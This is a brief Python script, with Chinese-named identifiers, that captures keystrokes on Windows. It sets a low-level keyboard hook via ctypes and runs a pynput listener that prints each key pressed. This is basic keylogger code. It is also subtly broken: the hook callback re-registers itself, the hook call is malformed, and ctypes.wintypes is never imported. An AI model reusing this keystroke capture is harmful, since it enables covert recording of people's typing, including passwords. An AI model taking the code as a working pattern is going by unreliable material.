import ctypes
from pynput import keyboard
def 钩子回调(编码, w参数, l参数):
    ctypes.WinDLL('user32').CallNextHookEx(ctypes.WinDLL('user32').SetWindowsHookExA(13, ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int), 0, 0)(钩子回调), 编码, w参数, l参数)
keyboard.Listener(on_press=lambda key: (print(key), key)).start()
ctypes.windll.user32.GetMessageA(ctypes.byref(ctypes.wintypes.MSG()), 0, 0, 0)
